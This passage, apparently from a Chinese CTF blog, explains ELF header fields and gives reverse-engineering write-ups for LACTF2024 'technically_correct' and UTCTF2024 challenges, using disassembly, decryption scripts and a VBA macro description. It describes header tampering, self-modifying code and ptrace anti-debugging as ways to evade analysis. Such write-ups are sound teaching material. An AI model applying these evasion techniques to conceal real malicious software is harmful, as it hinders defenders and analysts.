<h4 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h4><p>(<del>eh 是那个eh吗</del>)标记了文件头的大小 正如上面统计的 ls中这个值为<code>40 00</code>即64</p>
<h4 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h4><p>标记了程序头表中每个字段的字节大小(每个字段的大小相同) 在ls中为<code>38 00</code></p>
<h4 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h4><p>标记了程序头表的个数 与<code>e_phentsize</code>的成绩就是程序头表的大小 若没有则为0 在ls中为<code>0D 00</code></p>
<h4 id="e-shentsize-e-shnum"><a href="#e-shentsize-e-shnum" class="headerlink" title="e_shentsize &amp; e_shnum"></a>e_shentsize &amp; e_shnum</h4><p>标记段信息 与上述两个同理 不同的是段头表的数量如果超出了预留索引值<code>0xff00</code>的话<code>e_shnum</code>的值会被设为0 并将真正的值放入段头表的<code>sh_size</code>数组的索引为0的位置</p>
<h4 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h4><p>与段名表一同标记段头表的入口索引 如果没有段名表则储存<code>SHN_UNDEF</code> 与段头表数量类似超出<code>0xff00</code>的话会储存在段头表的<code>sh_link</code>数组的索引为0的位置</p>
<h3 id="应用场合"><a href="#应用场合" class="headerlink" title="应用场合"></a>应用场合</h3><p>修改某些与程序运行无关信息不会导致程序无法运行 同时可以干扰分析软件对其的识别 同时改变程序入口点还会导致程序跳过某段机器码 从而隐藏真实操作 例如:</p>
<h4 id="LACTF2024-rev-technically-correct-魔改ELF文件头"><a href="#LACTF2024-rev-technically-correct-魔改ELF文件头" class="headerlink" title="LACTF2024&#x2F;rev&#x2F;technically_correct | 魔改ELF文件头"></a>LACTF2024&#x2F;rev&#x2F;technically_correct | 魔改ELF文件头</h4><p>(<del>没错我就是为了这碗醋包的饺子</del>)DIE无法检测到可执行文件信息 binwalk识别错误 直接010打开 与ls做一下对比:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-195321.png" alt="image-20240226195321494"></p>
<p>不难看出文件头已经被改得很抽象了</p>
<p>用IDA打开也提示入口错误:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-195519.png" alt="image-20240226195519637"></p>
<p>对比多个ELF文件的入口点可以发现以下特征:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-200148.png" alt="image-20240226200148494"></p>
<p>可以看得出来其实这是个64位程序 再根据表头等偏移也可以看出实际上这应该是一个小端序ELF 更改文件头中对应的标志位 再次打开IDA可以看到<code>start</code>入口:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:000005C7D084C137                               start:</span><br><span class="line">LOAD:000005C7D084C137 48 8D 35 32 04 00 00          lea     rsi, unk_5C7D084C570</span><br><span class="line">LOAD:000005C7D084C13E 48 C7 C1 14 00 00 00          mov     rcx, 14h</span><br><span class="line">LOAD:000005C7D084C145 49 B8 F7 51 A4 C4 C0 28 FC 8F mov     r8, 8FFC28C0C4A451F7h</span><br><span class="line">LOAD:000005C7D084C145</span><br><span class="line">LOAD:000005C7D084C14F</span><br><span class="line">LOAD:000005C7D084C14F                               loc_5C7D084C14F:                        ; CODE XREF: LOAD:000005C7D084C156↓j</span><br><span class="line">LOAD:000005C7D084C14F 4C 31 06                      xor     [rsi], r8</span><br><span class="line">LOAD:000005C7D084C152 48 83 C6 08                   add     rsi, 8</span><br><span class="line">LOAD:000005C7D084C156 E2 F7                         loop    loc_5C7D084C14F</span><br><span class="line">LOAD:000005C7D084C156</span><br><span class="line">LOAD:000005C7D084C158 E9 13 04 00 00                jmp     near ptr unk_5C7D084C570</span><br></pre></td></tr></table></figure>

<p>可以看到是一个SMC 再通过<code>strace</code>指令可以看到启用了<code>ptrace</code>反调试:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;./technically_correct&quot;, [&quot;./technically_correct&quot;], 0x7ffde09bb8d8 /* 32 vars */) = 0</span><br><span class="line">ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)</span><br><span class="line">exit(0)                                 = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure>

<p>所以编写一个脚本来进行SMC:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_idaapi</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x5C7D084C570</span></span><br><span class="line">xorkey = <span class="number">0x8FFC28C0C4A451F7</span></span><br><span class="line"><span class="built_in">round</span> = <span class="number">0x14</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>):</span><br><span class="line">    idc.patch_qword(start + <span class="number">8</span> * i, idc.get_qword(start + <span class="number">8</span> * i) ^ xorkey)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Round %d: 0x%016X&quot;</span> % (i, start + <span class="number">8</span> * i))</span><br></pre></td></tr></table></figure>

<p>得到处理后的汇编代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:000005C7D084C570                               loc_5C7D084C570:                        ; CODE XREF: LOAD:000005C7D084C158↑j</span><br><span class="line">LOAD:000005C7D084C570                                                                       ; DATA XREF: LOAD:start↑o</span><br><span class="line">LOAD:000005C7D084C570 90                            nop                                     ; Keypatch filled range [0x5C7D084C570:0x5C7D084C576] (7 bytes), replaced:</span><br><span class="line">LOAD:000005C7D084C570                                                                       ;   mov eax, 65h</span><br><span class="line">LOAD:000005C7D084C570                                                                       ;   syscall</span><br><span class="line">LOAD:000005C7D084C571 90                            nop</span><br><span class="line">LOAD:000005C7D084C572 90                            nop</span><br><span class="line">LOAD:000005C7D084C573 90                            nop</span><br><span class="line">LOAD:000005C7D084C574 90                            nop</span><br><span class="line">LOAD:000005C7D084C575 90                            nop</span><br><span class="line">LOAD:000005C7D084C576 90                            nop</span><br><span class="line">LOAD:000005C7D084C577 85 C0                         test    eax, eax</span><br><span class="line">LOAD:000005C7D084C579 0F 85 84 00 00 00             jnz     loc_5C7D084C603</span><br><span class="line">LOAD:000005C7D084C579</span><br><span class="line">LOAD:000005C7D084C57F 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C580 48 83 FE 02                   cmp     rsi, 2</span><br><span class="line">LOAD:000005C7D084C584 7C 58                         jl      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C584</span><br><span class="line">LOAD:000005C7D084C586 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C587 5E                            pop     rsi</span><br><span class="line">LOAD:000005C7D084C588 48 BB E8 88 1F BC 84 0F 00 00 mov     rbx, 0F84BC1F88E8h</span><br><span class="line">LOAD:000005C7D084C588</span><br><span class="line">LOAD:000005C7D084C592</span><br><span class="line">LOAD:000005C7D084C592                               loc_5C7D084C592:                        ; CODE XREF: LOAD:000005C7D084C5CD↓j</span><br><span class="line">LOAD:000005C7D084C592 0F B6 06                      movzx   eax, byte ptr [rsi]             ; get input</span><br><span class="line">LOAD:000005C7D084C595 3C 0A                         cmp     al, 0Ah</span><br><span class="line">LOAD:000005C7D084C597 74 36                         jz      short yes_1</span><br><span class="line">LOAD:000005C7D084C597</span><br><span class="line">LOAD:000005C7D084C599 3C 00                         cmp     al, 0</span><br><span class="line">LOAD:000005C7D084C59B 74 32                         jz      short yes_1</span><br><span class="line">LOAD:000005C7D084C59B</span><br><span class="line">LOAD:000005C7D084C59D 3C 7E                         cmp     al, 7Eh ; &#x27;~&#x27;</span><br><span class="line">LOAD:000005C7D084C59F 77 3D                         ja      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C59F</span><br><span class="line">LOAD:000005C7D084C5A1 2C 20                         sub     al, 20h ; &#x27; &#x27;</span><br><span class="line">LOAD:000005C7D084C5A3 72 39                         jb      short no                        ; no</span><br><span class="line">LOAD:000005C7D084C5A3</span><br><span class="line">LOAD:000005C7D084C5A5</span><br><span class="line">LOAD:000005C7D084C5A5                               loc_5C7D084C5A5:                        ; CODE XREF: LOAD:000005C7D084C60C↓j</span><br><span class="line">LOAD:000005C7D084C5A5 48 8D 14 C3                   lea     rdx, [rbx+rax*8]                ; 0xF84BC1F88E8 + input[i]</span><br><span class="line">LOAD:000005C7D084C5A9 48 8B 1A                      mov     rbx, [rdx]                      ; mem[0xF84BC1F88E8 + input[i]]</span><br><span class="line">LOAD:000005C7D084C5AC 48 31 D3                      xor     rbx, rdx                        ; 0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]]</span><br><span class="line">LOAD:000005C7D084C5AF 49 B8 93 E6 C1 48 3C CB 16 B2 mov     r8, 0B216CB3C48C1E693h</span><br><span class="line">LOAD:000005C7D084C5B9 49 0F AF D8                   imul    rbx, r8                         ;  0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]] * 0xB216CB3C48C1E693</span><br><span class="line">LOAD:000005C7D084C5BD 49 B8 9D 52 7C 26 D3 C6 00 C2 mov     r8, 0C200C6D3267C529Dh</span><br><span class="line">LOAD:000005C7D084C5C7 4C 01 C3                      add     rbx, r8                         ;  0xF84BC1F88E8 + input[i] ^ mem[0xF84BC1F88E8 + input[i]] * 0xB216CB3C48C1E693 + 0xC200C6D3267C529D</span><br><span class="line">LOAD:000005C7D084C5CA 48 FF C6                      inc     rsi                             ; i++</span><br><span class="line">LOAD:000005C7D084C5CD EB C3                         jmp     short loc_5C7D084C592           ; get input</span><br><span class="line">LOAD:000005C7D084C5CD</span><br><span class="line">LOAD:000005C7D084C5CF                               ; ---------------------------------------------------------------------------</span><br><span class="line">LOAD:000005C7D084C5CF</span><br><span class="line">LOAD:000005C7D084C5CF                               yes_1:                                  ; CODE XREF: LOAD:000005C7D084C597↑j</span><br><span class="line">LOAD:000005C7D084C5CF                                                                       ; LOAD:000005C7D084C59B↑j</span><br><span class="line">LOAD:000005C7D084C5CF 48 B9 E0 0B C0 8F 03 07 00 00 mov     rcx, 7038FC00BE0h</span><br><span class="line">LOAD:000005C7D084C5D9 48 39 CB                      cmp     rbx, rcx</span><br><span class="line">LOAD:000005C7D084C5DC 74 0C                         jz      short yes                       ; yes</span><br><span class="line">LOAD:000005C7D084C5DC</span><br><span class="line">LOAD:000005C7D084C5DE</span><br><span class="line">LOAD:000005C7D084C5DE                               no:                                     ; CODE XREF: LOAD:000005C7D084C584↑j</span><br><span class="line">LOAD:000005C7D084C5DE                                                                       ; LOAD:000005C7D084C59F↑j</span><br><span class="line">LOAD:000005C7D084C5DE                                                                       ; LOAD:000005C7D084C5A3↑j</span><br><span class="line">LOAD:000005C7D084C5DE 68 6E 6F 0A 00                push    0A6F6Eh                         ; no</span><br><span class="line">LOAD:000005C7D084C5E3 BA 03 00 00 00                mov     edx, 3</span><br><span class="line">LOAD:000005C7D084C5E8 EB 0A                         jmp     short loc_5C7D084C5F4</span><br><span class="line">LOAD:000005C7D084C5E8</span><br><span class="line">LOAD:000005C7D084C5EA                               ; ---------------------------------------------------------------------------</span><br><span class="line">LOAD:000005C7D084C5EA</span><br><span class="line">LOAD:000005C7D084C5EA                               yes:                                    ; CODE XREF: LOAD:000005C7D084C5DC↑j</span><br><span class="line">LOAD:000005C7D084C5EA 68 79 65 73 0A                push    0A736579h                       ; yes</span><br><span class="line">LOAD:000005C7D084C5EF BA 04 00 00 00                mov     edx, 4</span><br><span class="line">LOAD:000005C7D084C5EF</span><br><span class="line">LOAD:000005C7D084C5F4</span><br><span class="line">LOAD:000005C7D084C5F4                               loc_5C7D084C5F4:                        ; CODE XREF: LOAD:000005C7D084C5E8↑j</span><br><span class="line">LOAD:000005C7D084C5F4 B8 01 00 00 00                mov     eax, 1</span><br><span class="line">LOAD:000005C7D084C5F9 BF 01 00 00 00                mov     edi, 1</span><br><span class="line">LOAD:000005C7D084C5FE</span><br><span class="line">LOAD:000005C7D084C5FE                               loc_5C7D084C5FE:                        ; CODE XREF: LOAD:000005C7D084C616↓j</span><br><span class="line">LOAD:000005C7D084C5FE 48 89 E6                      mov     rsi, rsp</span><br><span class="line">LOAD:000005C7D084C601 0F 05                         syscall                                 ; write</span><br><span class="line">LOAD:000005C7D084C601</span><br><span class="line">LOAD:000005C7D084C603</span><br><span class="line">LOAD:000005C7D084C603                               loc_5C7D084C603:                        ; CODE XREF: LOAD:000005C7D084C579↑j</span><br><span class="line">LOAD:000005C7D084C603 B8 3C 00 00 00                mov     eax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:000005C7D084C608 31 FF                         xor     edi, edi</span><br><span class="line">LOAD:000005C7D084C60A 0F 05                         syscall </span><br></pre></td></tr></table></figure>

<p>可以在<a href="https://filippo.io/linux-syscall-table/%E6%9F%A5%E6%89%BE%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8ID">https://filippo.io/linux-syscall-table/查找系统调用ID</a> 目的是输出<code>yes</code> flag通过命令行参数传入 具体逻辑写在注释中 用<code>readelf -a</code>读出所有虚拟内存:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 a8 9e b6 21 74 80 06 55 b8 e5 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           168 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: 9e&gt;</span><br><span class="line">  ABI Version:                       182</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0xc7b4d76e</span><br><span class="line">  Entry point address:               0x5c7d084c137</span><br><span class="line">  Start of program headers:          58 (bytes into file)</span><br><span class="line">  Start of section headers:          39047220244264590 (bytes into file)</span><br><span class="line">  Flags:                             0xb214c4dd</span><br><span class="line">  Size of this header:               16830 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         61</span><br><span class="line">  Size of section headers:           1 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 47031 &lt;corrupt: out of range&gt;</span><br><span class="line"></span><br><span class="line">There are no section groups in this file.</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  LOAD           0x0000000000001000 0x00000265a3ce8000 0xc28f4b0d8a362161</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x3cc4d55e9677dc9e</span><br><span class="line">  LOAD           0x0000000000002000 0x00000516ef99c000 0x3656c86e821bb521</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">  LOAD           0x000000000003c000 0x00000ae8f3641000 0x8da8b4d80a2f5556</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x3fce6f654e1eaf66</span><br><span class="line">  LOAD           0x000000000003d000 0x00000ccd481d4000 0x353d5269c3fd6e77</span><br><span class="line">                 0x0000000000001000 0x0000000000001000  RWE    0x10eaf695dc252738</span><br><span class="line"></span><br><span class="line">There is no dynamic section in this file.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>数据在虚拟内存和其在二进制文件中相对文件头的偏移的关系是<code>data_offset = seg_offset + data_virtaddr - seg_virtaddr</code> 据此可以写出脚本解密:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># segment_addr = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 0x00000265a3ce8000</span></span><br><span class="line"><span class="comment"># 0x00000516ef99c000</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># 0x00000ae8f3641000</span></span><br><span class="line"><span class="comment"># 0x00000ccd481d4000</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># segment_start = [int(k, 16) for k in segment_addr.split(&quot;\n&quot;)[1:-1]]</span></span><br><span class="line">segment_start = [<span class="number">2635563171840</span>, <span class="number">5596067250176</span>, <span class="number">242648760320</span>, <span class="number">5890218143744</span>, <span class="number">2735873134592</span>, <span class="number">12132385898496</span>, <span class="number">16697267249152</span>, <span class="number">3326682263552</span>, <span class="number">10460356464640</span>, <span class="number">8642733731840</span>, <span class="number">988726030336</span>, <span class="number">8708637028352</span>, <span class="number">2773839282176</span>, <span class="number">8133109415936</span>, <span class="number">3575512096768</span>, <span class="number">9797392764928</span>, <span class="number">1880326082560</span>, <span class="number">5535382552576</span>, <span class="number">5309783875584</span>, <span class="number">14846201360384</span>, <span class="number">15151867842560</span>, <span class="number">1420534173696</span>, <span class="number">3162423922688</span>, <span class="number">9884210810880</span>, <span class="number">3293418479616</span>, <span class="number">2848477061120</span>, <span class="number">9760137510912</span>, <span class="number">13268869967872</span>, <span class="number">6355754991616</span>, <span class="number">15773356351488</span>, <span class="number">17095304347648</span>, <span class="number">11089330114560</span>, <span class="number">8872599801856</span>, <span class="number">119536611328</span>, <span class="number">11962295312384</span>, <span class="number">14545242775552</span>, <span class="number">6175697338368</span>, <span class="number">3295986577408</span>, <span class="number">4857408086016</span>, <span class="number">1006577762304</span>, <span class="number">6169422487552</span>, <span class="number">10338827309056</span>, <span class="number">5784443174912</span>, <span class="number">7711878021120</span>, <span class="number">15179293179904</span>, <span class="number">2675108958208</span>, <span class="number">5810459635712</span>, <span class="number">15978780405760</span>, <span class="number">15805306486784</span>, <span class="number">12812716527616</span>, <span class="number">13144427872256</span>, <span class="number">5770609094656</span>, <span class="number">14127787970560</span>, <span class="number">17062766280704</span>, <span class="number">7485916786688</span>, <span class="number">3136088481792</span>, <span class="number">12072940883968</span>, <span class="number">3003644882944</span>, <span class="number">7554512248832</span>, <span class="number">11995632111616</span>, <span class="number">14075817705472</span>]</span><br><span class="line"><span class="comment"># base = ((base + input[i]) ^ mem[base + input[i]]) * 0xB216CB3C48C1E693 + 0xC200C6D3267C529D</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_physddr</span>(<span class="params">addr:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(segment_start)):</span><br><span class="line">        <span class="keyword">if</span> addr - segment_start[i] &gt;= <span class="number">0</span> <span class="keyword">and</span> addr - segment_start[i] &lt; <span class="number">0x1000</span>:</span><br><span class="line">            <span class="keyword">return</span> (i + <span class="number">1</span>) * <span class="number">0x1000</span> + addr - segment_start[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">musk1 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">musk2 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;technically_correct_edit&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = [<span class="built_in">ord</span>(i) - <span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;lactf&#123;&quot;</span>]</span><br><span class="line">    base = <span class="number">0xF84BC1F88E8</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    flags = []</span><br><span class="line">    stack = <span class="built_in">list</span>()</span><br><span class="line">    visited = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data1 = (flag[i] * <span class="number">0x8</span> + base) &amp; musk2</span><br><span class="line">        f.seek(find_physddr(data1))</span><br><span class="line">        data2 = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">8</span>), byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        data3 = data1 ^ data2</span><br><span class="line">        data4 = (data3 * <span class="number">0xB216CB3C48C1E693</span>) &amp; musk1</span><br><span class="line">        base = (data4 + <span class="number">0xC200C6D3267C529D</span>) &amp; musk2</span><br><span class="line">        <span class="comment"># print(hex(base))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(flag):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        visited.add(base)</span><br><span class="line">        </span><br><span class="line">    stack.append((base, flag))</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        base, flag = stack.pop()</span><br><span class="line">        <span class="keyword">if</span> base <span class="keyword">in</span> visited:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        visited.add(base)</span><br><span class="line">        <span class="keyword">if</span> base == <span class="number">0x7038FC00BE0</span>:</span><br><span class="line">            flags.append(flag)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5E</span>):</span><br><span class="line">            <span class="keyword">if</span> find_physddr((char * <span class="number">0x8</span> + base) &amp; musk2):</span><br><span class="line">                data1 = (char * <span class="number">0x8</span> + base) &amp; musk2</span><br><span class="line">                f.seek(find_physddr(data1))</span><br><span class="line">                data2 = <span class="built_in">int</span>.from_bytes(f.read(<span class="number">8</span>), byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                data3 = data1 ^ data2</span><br><span class="line">                data4 = (data3 * <span class="number">0xB216CB3C48C1E693</span>) &amp; musk1</span><br><span class="line">                base_ = (data4 + <span class="number">0xC200C6D3267C529D</span>) &amp; musk2</span><br><span class="line">                stack.append((base_, flag + [char]))</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i + <span class="number">0x20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line">    <span class="comment"># lactf&#123;i_l0v3_l1nux_elf_p4rs1ng&#125;</span></span><br></pre></td></tr></table></figure>



<p>以后遇到再更新应用案例…</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>文件格式</tag>
      </tags>
  </entry>
  <entry>
    <title>UTCTF2024逆向方向部分wp</title>
    <url>/2024/04/04/UTCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT, 无队伍</p>
<p>email:<a href="mailto:&#x6f;&#x6b;&#117;&#117;&#115;&#117;&#107;&#x75;&#64;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;">&#x6f;&#x6b;&#117;&#117;&#115;&#117;&#107;&#x75;&#64;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a></p>
<p>解出:Fruit Deals, PES-128</p>
<span id="more"></span>

<h2 id="Fruit-Deals-vba病毒"><a href="#Fruit-Deals-vba病毒" class="headerlink" title="Fruit Deals | vba病毒"></a>Fruit Deals | vba病毒</h2><p>附件是一个EXCEL表格 xml可以执行vba宏 可以使用<code>oletools</code>中的<code>olevba.exe</code>导出vba宏或直接打开EXCEL查看:</p>
<p>①<code>olevba.exe -c input &gt; output</code></p>
<p>②<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/04/20240404-095805.png" alt="image-20240404095758389" style="zoom:50%;" /></p>
<p>得到本题的两个模块 分别是用随机数的base64编码填充一个页, 按照这个页中的数据来拼接一条cmd Shellcode 按照题目描述 要通过Shellcode从服务器下载一个文件 获取这个文件名即是flag</p>
<p>base64填充的页是<code>Sheet2</code> 很明显被隐藏同样在显示代码界面将其属性改为可见然后手动拼接Shellcode得到flag:<code>utflag&#123;banANA-Hakrz09182afd4.exe&#125;</code></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/04/20240404-100416.png" alt="image-20240404100416705" style="zoom:67%;" />

<h2 id="PES-128-并行式加密"><a href="#PES-128-并行式加密" class="headerlink" title="PES-128 | 并行式加密"></a>PES-128 | 并行式加密</h2><p>总体来说题目的加密逻辑不难 但是多线程并行的加密方式弥补了这一点 具体看IDA伪代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *index; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v15; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">void</span> *end; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rdi</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v19; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> id; <span class="comment">// bl</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v21; <span class="comment">// r13</span></span><br><span class="line">  __int64 arg; <span class="comment">// rax</span></span><br><span class="line">  __m128i v23; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v24; <span class="comment">// r12</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v25; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v26; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *reslut; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v28; <span class="comment">// r14</span></span><br><span class="line">  __int64 v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> *v30; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">bool</span> v31; <span class="comment">// zf</span></span><br><span class="line">  _BYTE *v32; <span class="comment">// r13</span></span><br><span class="line">  __int64 (__fastcall *v33)(); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// al</span></span><br><span class="line">  __int64 (__fastcall *v36)(); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v37; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v38; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v39; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v40; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v42; <span class="comment">// r14</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v43; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> *v44; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">char</span> *v45; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> *v46; <span class="comment">// r10</span></span><br><span class="line">  __m128i v47; <span class="comment">// xmm5</span></span><br><span class="line">  _BYTE *v48; <span class="comment">// rax</span></span><br><span class="line">  __m128i v49; <span class="comment">// [rsp+0h] [rbp-188h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> padding; <span class="comment">// [rsp+18h] [rbp-170h]</span></span><br><span class="line">  <span class="type">void</span> *src; <span class="comment">// [rsp+20h] [rbp-168h]</span></span><br><span class="line">  <span class="built_in">std</span>::thread *v52; <span class="comment">// [rsp+28h] [rbp-160h]</span></span><br><span class="line">  __int64 lenth; <span class="comment">// [rsp+30h] [rbp-158h]</span></span><br><span class="line">  __int64 *v54; <span class="comment">// [rsp+38h] [rbp-150h]</span></span><br><span class="line">  <span class="type">char</span> *v55; <span class="comment">// [rsp+40h] [rbp-148h]</span></span><br><span class="line">  <span class="type">char</span> *v56; <span class="comment">// [rsp+48h] [rbp-140h]</span></span><br><span class="line">  __int64 v57; <span class="comment">// [rsp+50h] [rbp-138h] BYREF</span></span><br><span class="line">  __int64 v58; <span class="comment">// [rsp+58h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *hex_vec[<span class="number">2</span>]; <span class="comment">// [rsp+60h] [rbp-128h] BYREF</span></span><br><span class="line">  _BYTE *v60; <span class="comment">// [rsp+70h] [rbp-118h]</span></span><br><span class="line">  __int64 v61; <span class="comment">// [rsp+80h] [rbp-108h] BYREF</span></span><br><span class="line">  _QWORD *v62; <span class="comment">// [rsp+88h] [rbp-100h]</span></span><br><span class="line">  __int64 v63; <span class="comment">// [rsp+90h] [rbp-F8h]</span></span><br><span class="line">  __int64 v64; <span class="comment">// [rsp+98h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">void</span> *input[<span class="number">2</span>]; <span class="comment">// [rsp+A0h] [rbp-E8h] BYREF</span></span><br><span 